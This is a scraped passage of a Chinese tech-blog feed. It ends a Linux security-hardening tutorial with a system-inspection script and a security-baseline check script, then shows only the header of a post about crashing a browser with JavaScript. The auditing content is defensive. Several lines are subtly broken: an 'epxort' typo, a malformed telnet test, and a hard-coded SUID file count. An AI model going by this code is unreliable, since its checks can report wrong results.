<span class="hljs-comment">#2. 获取用户密码过期时间chage -l 用户名看</span>
chage -l root
<span class="hljs-comment">#3. 过期时间与当前时间相减 (秒)</span>
<span class="hljs-comment">#4. 转换为天 与30天对比</span>
<span class="hljs-comment">#5. 与30对比即可</span>
</code></pre>
<h5 data-id="heading-52">1.4配置使用ssh方式远程访问</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#使用ssh远程连接,禁用telnet</span>
<span class="hljs-comment">#检查点检查服务是否运行或开启即可.</span>
telnet <span class="hljs-comment">#方式关闭</span>
ssh <span class="hljs-comment">#方式开启</span>
[root@lb01 ~]<span class="hljs-comment"># systemctl is-active sshd telnet</span>
active
unknown
</code></pre>
<h5 data-id="heading-53">1.5配置历史口令使用策略</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#最近5次的密码不能相同</span>
password requisite pam_pwhistory.so remember=5

</code></pre>
<h4 data-id="heading-54">2.访问控制</h4>
<h5 data-id="heading-55">2.1锁定无关用户</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#不用的用户,锁定,注释</span>

<span class="hljs-comment">#lock (root)</span>
passwd -l
<span class="hljs-comment">#解锁 (root)</span>
passwd -u
<span class="hljs-comment">#通过</span>
passwd -S 用户名查看是否锁定
/etc/shadow 第2列是否!!叹号
<span class="hljs-comment">#可以注释掉用户.</span>
lp nuucp hpdb <span class="hljs-built_in">sync</span> adm ftp games
</code></pre>
<h5 data-id="heading-56">2.2清楚uid为0的非root用户</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#检查是否存在 是否有uid是0 用户名不是root的用户.</span>
awk -F: <span class="hljs-string">'$3==0 &amp;&amp; $1!="root" {print $1}'</span> /etc/passwd 
</code></pre>
<h5 data-id="heading-57">2.3控制为授权的suid/sgid</h5>
<ul>
<li>取PATH变量存放的目录中的命令</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#-perm 按照文件权限查找</span>
find <span class="hljs-variable">${PATH//:/}</span> /tmp/ -perm /+s 2&gt;/dev/null |xargs <span class="hljs-built_in">ls</span> -ld --color
</code></pre>
<h5 data-id="heading-58">2.4控制任何人都有写权限的目录</h5>
<ul>
<li>o上有w的目录</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">find / -<span class="hljs-built_in">type</span> d -perm /o+w |xargs <span class="hljs-built_in">ls</span> -ld
</code></pre>
<h5 data-id="heading-59">2.5控制任何人都有写权限的文件</h5>
<ul>
<li>o上有w的文件</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">find / -<span class="hljs-built_in">type</span> f -perm /o+w 2&gt;/dev/null |egrep -v <span class="hljs-string">"^/sys|^/proc"</span> |<span class="hljs-built_in">wc</span> -l
</code></pre>
<h5 data-id="heading-60">2.6删除没有属主的文件</h5>
<pre><code class="hljs language-sh" lang="sh">find / -nouser -o -nogroup 2&gt;/dev/null |<span class="hljs-built_in">wc</span> -l
</code></pre>
<h5 data-id="heading-61">2.7控制异常或隐藏文件</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#查找以点开始的文件</span>
find / -name <span class="hljs-string">".*"</span> |xargs <span class="hljs-built_in">ls</span> -ld
</code></pre>
<h4 data-id="heading-62">3.安全审计</h4>
<h5 data-id="heading-63">3.1配置使用ntp</h5>
<pre><code class="hljs language-sh" lang="sh">ntpdate ntp1.aliyun.com
</code></pre>
<h4 data-id="heading-64">4.入侵防护</h4>
<h5 data-id="heading-65">4.1配置登录超时自动退出</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">export</span> TMOUT=3
epxort HISTSIZE=10
<span class="hljs-built_in">export</span> HISTFILESIZE=10
</code></pre>
<h5 data-id="heading-66">4.2限制root账户远程登录</h5>
<pre><code class="hljs language-sh" lang="sh">PermitRootLogin no
</code></pre>
<h3 data-id="heading-67">九、脚本汇总</h3>
<h4 data-id="heading-68">1.系统巡检脚本</h4>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim sys_info.sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:sys_info.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:系统巡检基本脚本</span>
<span class="hljs-comment">########################################################</span>

. /server/scripts/devops-shell/func.sh

<span class="hljs-comment">#1.基础信息</span>
<span class="hljs-function"><span class="hljs-title">base_info</span></span>() {
  hostname=`hostname`
  ip=`hostname -I`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########基本信息##############"</span>
  greenecho <span class="hljs-string">"主机名：<span class="hljs-variable">$hostname</span>"</span>
  greenecho <span class="hljs-string">"ip地址：<span class="hljs-variable">$ip</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
} 

<span class="hljs-comment">#2.负载</span>
<span class="hljs-function"><span class="hljs-title">load_info</span></span>() {
  load1=`<span class="hljs-built_in">uptime</span> |awk -F<span class="hljs-string">'[ ,]+'</span> <span class="hljs-string">'{print $(NF-2)}'</span>`
  load5=`<span class="hljs-built_in">uptime</span> |awk -F<span class="hljs-string">'[ ,]+'</span> <span class="hljs-string">'{print $(NF-1)}'</span>`
  load15=`<span class="hljs-built_in">uptime</span> |awk -F<span class="hljs-string">'[ ,]+'</span> <span class="hljs-string">'{print $NF}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########负载信息##############"</span>
  greenecho <span class="hljs-string">"最近1分钟负载：<span class="hljs-variable">$load1</span>"</span>
  greenecho <span class="hljs-string">"最近5分钟负载：<span class="hljs-variable">$load5</span>"</span>
  greenecho <span class="hljs-string">"最近15分钟负载：<span class="hljs-variable">$load15</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-comment">#3.内存</span>
<span class="hljs-function"><span class="hljs-title">mem_info</span></span>() {
  mem_total=`free -h |awk <span class="hljs-string">'NR==2{print $2}'</span>`
  mem_used=`free -h  |awk <span class="hljs-string">'NR==2{print ($3+$6)}'</span>`
  mem_used_percent=`free |awk <span class="hljs-string">'NR==2{print ($3+$6)/$2*100"%"}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########内存信息##############"</span>
  greenecho <span class="hljs-string">"总计内存：<span class="hljs-variable">$mem_total</span>"</span>
  greenecho <span class="hljs-string">"已用内存：<span class="hljs-variable">${mem_used}</span>M"</span>
  greenecho <span class="hljs-string">"内存使用率：<span class="hljs-variable">$mem_used_percent</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-comment">#4.swap</span>
<span class="hljs-function"><span class="hljs-title">swap_info</span></span>() {
  swap_total=`free -h |awk <span class="hljs-string">'NR==3{print $2}'</span>`
  swap_used=`free -h  |awk <span class="hljs-string">'NR==3{print ($3+$6)}'</span>`
  swap_used_percent=`free |awk <span class="hljs-string">'NR==3{print ($3+$6)/$2*100"%"}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########swap信息##############"</span>
  greenecho <span class="hljs-string">"总计swap：<span class="hljs-variable">$swap_total</span>"</span>
  greenecho <span class="hljs-string">"已用swap：<span class="hljs-variable">${swap_used}</span>M"</span>
  greenecho <span class="hljs-string">"swap使用率：<span class="hljs-variable">$swap_used_percent</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-comment">#5.磁盘</span>

<span class="hljs-function"><span class="hljs-title">disk_info</span></span>() {
  disk_total=`fdisk -l |grep <span class="hljs-string">'/dev/[sv]d[a-z][:：]'</span> |<span class="hljs-built_in">wc</span> -l`
  root_size=`<span class="hljs-built_in">df</span> -h | awk <span class="hljs-string">'$NF=="/"{print $2}'</span>`
  root_used_percent=`<span class="hljs-built_in">df</span> -h | awk <span class="hljs-string">'$NF=="/"{print $(NF-1)}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########磁盘信息##############"</span>
  greenecho <span class="hljs-string">"总计硬盘个数：<span class="hljs-variable">$disk_total</span>"</span>
  greenecho <span class="hljs-string">"根分区大小：<span class="hljs-variable">${root_size}</span>"</span>
  greenecho <span class="hljs-string">"根分区使用率：<span class="hljs-variable">$root_used_percent</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-comment">#6.进程</span>
<span class="hljs-function"><span class="hljs-title">proc_info</span></span>() {
  proc_total=`top -bn1 |awk <span class="hljs-string">'NR==2{print $2}'</span>`
  proc_running=`top -bn1 |awk <span class="hljs-string">'NR==2{print $4}'</span>`
  proc_stopped=`top -bn1 |awk <span class="hljs-string">'NR==2{print $8}'</span>`
  proc_zombie=`top -bn1 |awk <span class="hljs-string">'NR==2{print $10}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########进程信息##############"</span>
  greenecho <span class="hljs-string">"进程总数：<span class="hljs-variable">$proc_total</span>"</span>
  greenecho <span class="hljs-string">"正在运行的进程数：<span class="hljs-variable">${proc_running}</span>"</span>
  greenecho <span class="hljs-string">"挂起的进程数：<span class="hljs-variable">$proc_stopped</span>"</span>
  greenecho <span class="hljs-string">"僵尸进程数：<span class="hljs-variable">$proc_zombie</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  base_info
  load_info
  mem_info
  swap_info 
  disk_info
  proc_info
}

main

</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0774529f73246b4bb8274b18f5b562a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873020&amp;x-signature=jV1VaAqkaznrbcNqiNREM2FoY%2Bc%3D" alt="image-20230426114043734" loading="lazy"/></p>
<h4 data-id="heading-69">2.安全基线检查脚本</h4>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim   project_linux_base_line_check.sh </span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:project_linux_base_line_check.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:安全基线检查脚本</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.加载函数</span>
. /server/scripts/devops-shell/func.sh
<span class="hljs-function"><span class="hljs-title">printline</span></span>() {
   blueecho <span class="hljs-string">"------------<span class="hljs-variable">$1</span>--------------"</span>
}

<span class="hljs-comment"># -ne不等于0</span>
<span class="hljs-function"><span class="hljs-title">check_root</span></span>() {
  [ <span class="hljs-variable">$UID</span> -ne 0 ] &amp;&amp; {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"只能root用户使用该脚本"</span>
    <span class="hljs-built_in">exit</span> 1
  }
}
<span class="hljs-function"><span class="hljs-title">check_cmd</span></span>() {
  <span class="hljs-built_in">which</span> wget nc ntpdate &amp;&gt;/dev/null
  [ $? -ne 0 ] &amp;&amp; {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"没有安装常用工具"</span>
    <span class="hljs-built_in">exit</span> 2
  }
}
<span class="hljs-comment">#2.函数</span>
<span class="hljs-comment">#####身份鉴权#####</span>
<span class="hljs-function"><span class="hljs-title">user_password_complex</span></span>() {
  printline 1.检查密码复杂度
  pass_complex=`egrep -o <span class="hljs-string">'minlen|[uld]credit'</span> /etc/pam.d/system-auth |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$pass_complex</span> -eq 4 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"密码复杂度配置OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"未配置密码复杂度failed"</span>
    rc=1  
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-function"><span class="hljs-title">user_password_lock</span></span>() {
  printline 2.检查密码认证失败锁定的配置
  pass_lock=`grep pam_tally2.so /etc/pam.d/system-auth |egrep -o <span class="hljs-string">'deny=|unlock_time='</span> |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$pass_lock</span> -eq 2 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"密码认证失败锁定配置OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"密码认证失败锁定配置failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}

<span class="hljs-function"><span class="hljs-title">user_password_expire</span></span>() {
  printline 3.检查口令生存期配置
  pass_max_days=`awk <span class="hljs-string">'/^PASS_MAX_DAYS/{print $2}'</span> /etc/login.defs`
  pass_warn_age=`awk <span class="hljs-string">'/^PASS_WARN_AGE/{print $2}'</span> /etc/login.defs`
  max_days=90
  warn_age=7
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$pass_max_days</span> -le <span class="hljs-variable">$max_days</span> -a <span class="hljs-variable">$pass_warn_age</span> -ge <span class="hljs-variable">$warn_age</span> ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"口令生存周期配置OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"口令生存周期未配置failed"</span>
    rc=1  
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span> 
}

<span class="hljs-function"><span class="hljs-title">check_user_password_expire</span></span>() {
  expire_days=30
  printline 4.检查是否有口令最近<span class="hljs-variable">${expire_days}</span>天将要过期的用户
  login_user=`awk -F: <span class="hljs-string">'$NF=="/bin/bash" {print $1}'</span> /etc/passwd`
  <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> <span class="hljs-variable">$login_user</span>
  <span class="hljs-keyword">do</span>
    expire_status=`chage -l <span class="hljs-variable">$name</span> |awk -F:  <span class="hljs-string">'NR==2{print $2}'</span>`
    [ <span class="hljs-string">"<span class="hljs-variable">$expire_status</span>"</span> = <span class="hljs-string">" never"</span> ] &amp;&amp; <span class="hljs-built_in">continue</span>
    time_expire_second=`<span class="hljs-built_in">date</span> -d <span class="hljs-string">"<span class="hljs-variable">$expire_status</span>"</span> +%s`
    time_now_second=`<span class="hljs-built_in">date</span> +%s`
    time_leave_days=`<span class="hljs-built_in">echo</span> <span class="hljs-string">"(<span class="hljs-variable">${time_expire_second}</span>-<span class="hljs-variable">${time_now_second}</span>)/86400"</span> |bc`
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$time_leave_days</span> -le <span class="hljs-variable">$expire_days</span> ];<span class="hljs-keyword">then</span>
      redecho <span class="hljs-string">"用户<span class="hljs-variable">${name}</span>即将过期，你还有<span class="hljs-variable">${time_leave_days}</span>天"</span>
    <span class="hljs-keyword">fi</span>
  <span class="hljs-keyword">done</span>
}

<span class="hljs-function"><span class="hljs-title">user_remote_access</span></span>() {
  printline 5.检查是否开启未加密传输服务
  <span class="hljs-keyword">if</span> [ nc -z localhost 23 &amp;&gt;/dev/null ];<span class="hljs-keyword">then</span>
    redecho <span class="hljs-string">"开启了未加密的telnet服务"</span>
    rc=1
  <span class="hljs-keyword">else</span>
    greenecho <span class="hljs-string">"telnet服务已关闭"</span>
    rc=0
  <span class="hljs-keyword">fi</span>
}

<span class="hljs-function"><span class="hljs-title">user_password_history</span></span>() {
  printline 6.检查是否配置历史口令重复要求
  pass_history=`grep pam_pwhistory.so /etc/pam.d/system-auth |grep -o remember |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$pass_history</span> -eq 1 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"历史口令重复策略配置OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"未配置历史口令策略failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-comment">########访问控制########</span>
<span class="hljs-function"><span class="hljs-title">deny_useless_user</span></span>() {
  printline 7.检查是否禁用无用用户
  useless_user_cnt=`grep -v <span class="hljs-string">'^#'</span> /etc/passwd |egrep <span class="hljs-string">'lp|nuucp|hpdb|sync|adm|ftp|games'</span> |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$useless_user_cnt</span> -eq 0 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"禁用了无用用户OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"未禁用无用用户failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-function"><span class="hljs-title">fake_root_user</span></span>() {
  printline 8.检查是否存在uid为0，用户名不是root的用户
  fake_root=`awk -F: <span class="hljs-string">'$3==0 &amp;&amp; $1!="root" {print $1}'</span> /etc/passwd |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$fake_root</span> -eq 0 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"不存在这样的用户OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"存在这样的用户failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-function"><span class="hljs-title">check_uid_gid_file</span></span>() {
  printline 9.检查是否存在额外的uid，gid文件
  uid_gid_file=`find <span class="hljs-variable">${PATH//:/ }</span> /tmp/ -perm /+s 2&gt;/dev/null|<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$uid_gid_file</span> -eq 23 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"uid,gid文件OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"uid,gid文件failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}

<span class="hljs-function"><span class="hljs-title">check_everybody_write_dir</span></span>() {
  printline 10.检查是否有过大权限的目录
  dir_777=`find / -<span class="hljs-built_in">type</span> d -perm /o+w |egrep -v <span class="hljs-string">'/tmp|/dev'</span> |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$dir_777</span> -eq 0 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"系统没有过大权限的目录OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"系统有大过大权限的目录failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}

<span class="hljs-function"><span class="hljs-title">check_hidden</span></span>() {
  printline 11.检查是否有隐藏文件或目录
  dir_list=`awk <span class="hljs-string">'$3~/xfs|ext[2-4]/{print $2}'</span> /etc/fstab `
  <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$dir_list</span>
  <span class="hljs-keyword">do</span>
    hidden_cnt=`find <span class="hljs-variable">$dir</span> -xdev -name <span class="hljs-string">".*"</span> |egrep -v <span class="hljs-string">"/sys/|/proc/"</span> |<span class="hljs-built_in">wc</span> -l`
    greenecho <span class="hljs-string">"<span class="hljs-variable">$dir</span> 磁盘分区  隐藏文件的数量：<span class="hljs-variable">$hidden_cnt</span>"</span>
  <span class="hljs-keyword">done</span>
}

<span class="hljs-comment">#####安全审计#####</span>
<span class="hljs-function"><span class="hljs-title">check_ntp</span></span>() {
  printline 12.检查是否配置了时间同步
  ntp_sync=`crontab -l|grep ntpdate |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$ntp_sync</span> -eq 1 ];<span class="hljs-keyword">then</span> 
     greenecho <span class="hljs-string">"配置了时间同步OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"没有配置时间同步failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-comment">#####入侵防护#####</span>
<span class="hljs-function"><span class="hljs-title">check_env</span></span>() {
  printline 13.检查是否配置了安全的环境变量
  
  <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$TMOUT</span>"</span>x != <span class="hljs-string">""</span>x -a <span class="hljs-variable">$HISTSIZE</span> -le 10 ];<span class="hljs-keyword">then</span>
     greenecho <span class="hljs-string">"配置了安全的环境变量OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"没有配置安全的环境变量failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}

<span class="hljs-function"><span class="hljs-title">check_root_remote_login</span></span>() {
  printline 14.检查root是否可以远程登录
  root_remote_login=`awk <span class="hljs-string">'/^PermitRootLogin/{print $2}'</span> /etc/ssh/sshd_config`
  <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$root_remote_login</span>"</span>x = <span class="hljs-string">"no"</span>x ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"root禁用了远程登录功能OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"root开启了远程登录功能failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}
<span class="hljs-comment">#####身份鉴权#####</span>
<span class="hljs-function"><span class="hljs-title">user</span></span>() {
  user_password_complex
  user_password_lock
  user_password_expire
  check_user_password_expire
  user_remote_access
  user_password_history
}

<span class="hljs-comment">#####访问控制#####</span>
<span class="hljs-function"><span class="hljs-title">access</span></span>() {
  deny_useless_user
  fake_root_user
  check_uid_gid_file
  check_everybody_write_dir
  check_hidden
}

<span class="hljs-comment">#####安全审计#####</span>
<span class="hljs-function"><span class="hljs-title">audit</span></span>() {
 check_ntp 
}

<span class="hljs-comment">#####入侵防护#####</span>
<span class="hljs-function"><span class="hljs-title">ruqin</span></span>() {
  check_env
  check_root_remote_login
}

<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  check_root
  check_cmd
  user
  access
  audit
  ruqin
}

main

</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dea24aeceae04a1a9bbb282338990802~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873020&amp;x-signature=z02rWdVbDxrmmMa0%2FnX9Fq6BCU8%3D" alt="image-20230426102818867" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我是如何用一行 JS 代码，让你的浏览器内存瞬间崩溃的？]]></title>    <link>https://juejin.cn/post/7594396523439964195</link>    <guid>https://juejin.cn/post/7594396523439964195</guid>    <pubDate>2026-01-13T04:11:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594396523439964195" data-draft-id="7594303923362873384" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我是如何用一行 JS 代码，让你的浏览器内存瞬间崩溃的？"/> <meta itemprop="keywords" content="前端,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-13T04:11:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我是如何用一行 JS 代码，让你的浏览器内存瞬间崩溃的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T04:11:47.000Z" title="Tue Jan 13 2026 04:11:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media 